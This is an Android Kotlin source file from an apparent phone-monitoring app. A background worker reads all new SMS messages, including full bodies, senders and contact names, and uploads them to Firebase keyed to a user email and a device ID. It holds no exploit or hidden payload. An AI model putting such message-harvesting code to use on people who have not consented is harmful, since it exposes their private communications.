package com.mshomeguardian.logger.workers

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.mshomeguardian.logger.data.AppDatabase
import com.mshomeguardian.logger.data.MessageEntity
import com.mshomeguardian.logger.utils.AuthManager
import com.mshomeguardian.logger.utils.DeviceIdentifier
import com.mshomeguardian.logger.utils.FirebaseServiceHelper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.*

class MessageWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    private val db = AppDatabase.getInstance(context.applicationContext)
    private val deviceId = DeviceIdentifier.getPersistentDeviceId(context.applicationContext)

    companion object {
        private const val TAG = "MessageWorker"
        private const val SYNC_LIMIT = 500

        // Threshold for automatic synchronization
        private const val MESSAGE_COUNT_THRESHOLD = 3

        /**
         * Check if there are enough new messages to trigger a sync
         */
        suspend fun shouldSync(context: Context): Boolean {
            // Skip check if permission is not granted
            if (ContextCompat.checkSelfPermission(
                    context, Manifest.permission.READ_SMS
                ) != PackageManager.PERMISSION_GRANTED) {
                return false
            }

            // Skip if user not authenticated
            if (!AuthManager.isSignedIn()) {
                return false
            }

            try {
                val lastSyncTime = context.getSharedPreferences(
                    "message_sync", Context.MODE_PRIVATE).getLong("last_sync_time", 0)

                // Query the number of new messages since last sync
                val uri = Telephony.Sms.CONTENT_URI
                val projection = arrayOf(Telephony.Sms._ID)
                val selection = "${Telephony.Sms.DATE} > ?"
                val selectionArgs = arrayOf(lastSyncTime.toString())

                context.contentResolver.query(
                    uri, projection, selection, selectionArgs, null
                )?.use { cursor ->
                    val count = cursor.count
                    Log.d(TAG, "Found $count new messages since last sync")
                    return count >= MESSAGE_COUNT_THRESHOLD
                }

                return false
            } catch (e: Exception) {
                Log.e(TAG, "Error checking for new messages", e)
                return false
            }
        }
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        return@withContext try {
            // Check authentication first
            val userEmail = AuthManager.getCurrentUser()?.email
            if (userEmail == null) {
                Log.w(TAG, "User not authenticated, skipping message sync")
                return@withContext Result.success()
            }

            // Check permissions
            if (ContextCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.READ_SMS
                ) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Missing READ_SMS permission")
                return@withContext Result.failure()
            }

            // Check if Firebase is available
            if (!FirebaseServiceHelper.isFirebaseAvailable()) {
                Log.w(TAG, "Firebase not available, skipping message sync")
                return@withContext Result.success()
            }

            // Get last sync time from shared preferences
            val prefs = applicationContext.getSharedPreferences("message_sync", Context.MODE_PRIVATE)
            val lastSyncTime = prefs.getLong("last_sync_time", 0)
            val currentTime = System.currentTimeMillis()

            // Sync SMS messages
            val syncCount = syncMessages(lastSyncTime, currentTime)

            // Upload new records to Firebase using new structure
            val uploadCount = uploadNewRecords(userEmail)

            // Update last sync time if successful
            prefs.edit().putLong("last_sync_time", currentTime).apply()

            Log.d(TAG, "Message sync completed. Synced $syncCount records, uploaded $uploadCount to Firebase.")
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Error syncing messages", e)
            Result.retry()
        }
    }

    private suspend fun syncMessages(lastSyncTime: Long, currentTime: Long): Int {
        val messages = mutableListOf<MessageEntity>()
        var cursor: Cursor? = null

        try {
            // Query SMS messages since last sync
            val uri = Telephony.Sms.CONTENT_URI
            val projection = arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.DATE,
                Telephony.Sms.BODY,
                Telephony.Sms.TYPE,
                Telephony.Sms.READ,
                Telephony.Sms.SEEN,
                Telephony.Sms.STATUS,
                Telephony.Sms.SUBJECT,
                Telephony.Sms.THREAD_ID,
                Telephony.Sms.PERSON,
                Telephony.Sms.PROTOCOL,
                Telephony.Sms.REPLY_PATH_PRESENT,
                Telephony.Sms.SERVICE_CENTER
            )

            val selection = "${Telephony.Sms.DATE} > ?"
            val selectionArgs = arrayOf(lastSyncTime.toString())
            val sortOrder = "${Telephony.Sms.DATE} DESC"

            cursor = applicationContext.contentResolver.query(
                uri, projection, selection, selectionArgs, sortOrder
            )

            cursor?.let {
                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
                val readIndex = it.getColumnIndex(Telephony.Sms.READ)
                val seenIndex = it.getColumnIndex(Telephony.Sms.SEEN)
                val statusIndex = it.getColumnIndex(Telephony.Sms.STATUS)
                val subjectIndex = it.getColumnIndex(Telephony.Sms.SUBJECT)
                val threadIdIndex = it.getColumnIndex(Telephony.Sms.THREAD_ID)
                val personIndex = it.getColumnIndex(Telephony.Sms.PERSON)
                val protocolIndex = it.getColumnIndex(Telephony.Sms.PROTOCOL)
                val replyPathPresentIndex = it.getColumnIndex(Telephony.Sms.REPLY_PATH_PRESENT)
                val serviceCenterIndex = it.getColumnIndex(Telephony.Sms.SERVICE_CENTER)

                var recordsProcessed = 0

                while (it.moveToNext() && recordsProcessed < SYNC_LIMIT) {
                    val messageId = if (idIndex >= 0) it.getString(idIndex) else UUID.randomUUID().toString()
                    val address = if (addressIndex >= 0) it.getString(addressIndex) ?: "" else ""
                    val date = if (dateIndex >= 0) it.getLong(dateIndex) else currentTime
                    val body = if (bodyIndex >= 0) it.getString(bodyIndex) else null
                    val type = if (typeIndex >= 0) it.getInt(typeIndex) else Telephony.Sms.MESSAGE_TYPE_INBOX
                    val read = if (readIndex >= 0) it.getInt(readIndex) == 1 else false
                    val seen = if (seenIndex >= 0) it.getInt(seenIndex) == 1 else false
                    val status = if (statusIndex >= 0) it.getInt(statusIndex) else null
                    val subject = if (subjectIndex >= 0) it.getString(subjectIndex) else null
                    val threadId = if (threadIdIndex >= 0) it.getLong(threadIdIndex) else null
                    val person = if (personIndex >= 0) it.getString(personIndex) else null
                    val protocol = if (protocolIndex >= 0) it.getInt(protocolIndex) else null
                    val replyPathPresent = if (replyPathPresentIndex >= 0) it.getInt(replyPathPresentIndex) == 1 else null
                    val serviceCenter = if (serviceCenterIndex >= 0) it.getString(serviceCenterIndex) else null

                    // Look up contact name if available
                    val contactName = getContactNameFromNumber(address)

                    val messageEntity = MessageEntity(
                        messageId = messageId,
                        syncTimestamp = currentTime,
                        phoneNumber = address,
                        timestamp = date,
                        body = body,
                        type = type,
                        subject = subject,
                        messageType = "SMS",
                        contactName = contactName,
                        isRead = read,
                        seen = seen,
                        deliveryStatus = status,
                        errorCode = null,
                        deletedLocally = false,
                        uploadedToCloud = false,
                        thread_id = threadId,
                        person = person,
                        protocol = protocol,
                        replyPathPresent = replyPathPresent,
                        serviceCenter = serviceCenter,
                        status = status,
                        deviceId = deviceId
                    )

                    val existingMessage = db.messageDao().getMessageByMessageId(messageId)
                    if (existingMessage == null) {
                        messages.add(messageEntity)
                    } else {
                        if (existingMessage.isRead != read ||
                            existingMessage.seen != seen ||
                            existingMessage.body != body) {

                            db.messageDao().updateMessage(messageEntity.copy(
                                id = existingMessage.id,
                                uploadedToCloud = existingMessage.uploadedToCloud,
                                uploadTimestamp = existingMessage.uploadTimestamp
                            ))
                        }
                    }

                    recordsProcessed++
                }
            }

            if (messages.isNotEmpty()) {
                db.messageDao().insertMessages(messages)
                Log.d(TAG, "Inserted ${messages.size} new messages")
            }

            return messages.size
        } catch (e: Exception) {
            Log.e(TAG, "Error querying messages", e)
            throw e
        } finally {
            cursor?.close()
        }
    }

    private fun getContactNameFromNumber(phoneNumber: String): String? {
        if (phoneNumber.isBlank()) return null

        val uri = Uri.withAppendedPath(
            android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
            Uri.encode(phoneNumber)
        )

        val projection = arrayOf(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME)

        return try {
            applicationContext.contentResolver.query(
                uri, projection, null, null, null
            )?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val nameIndex = cursor.getColumnIndex(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME)
                    if (nameIndex >= 0) cursor.getString(nameIndex) else null
                } else null
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error looking up contact name", e)
            null
        }
    }

    private suspend fun uploadNewRecords(userEmail: String): Int {
        try {
            val notUploadedMessages = db.messageDao().getNotUploadedMessages()
            Log.d(TAG, "Found ${notUploadedMessages.size} messages to upload")

            var successCount = 0

            for (message in notUploadedMessages) {
                try {
                    // Create message data map
                    val messageData = mapOf(
                        "messageId" to message.messageId,
                        "syncTimestamp" to message.syncTimestamp,
                        "phoneNumber" to message.phoneNumber,
                        "timestamp" to message.timestamp,
                        "body" to (message.body ?: ""),
                        "type" to message.type,
                        "subject" to (message.subject ?: ""),
                        "messageType" to message.messageType,
                        "contactName" to (message.contactName ?: ""),
                        "isRead" to message.isRead,
                        "seen" to message.seen,
                        "deliveryStatus" to (message.deliveryStatus ?: 0),
                        "timezone" to message.timezone,
                        "deviceId" to deviceId,
                        "uploadedAt" to System.currentTimeMillis()
                    )

                    // Upload using new Firebase structure
                    val success = FirebaseServiceHelper.uploadMessage(userEmail, deviceId, messageData)

                    if (success) {
                        val uploadTime = System.currentTimeMillis()
                        db.messageDao().markMessageAsUploaded(message.id, uploadTime)
                        successCount++
                        Log.d(TAG, "Message ${message.messageId} uploaded successfully")
                    } else {
                        Log.w(TAG, "Failed to upload message ${message.messageId}")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error uploading message ${message.messageId}", e)
                }
            }

            return successCount
        } catch (e: Exception) {
            Log.e(TAG, "Error in uploadNewRecords", e)
            return 0
        }
    }
}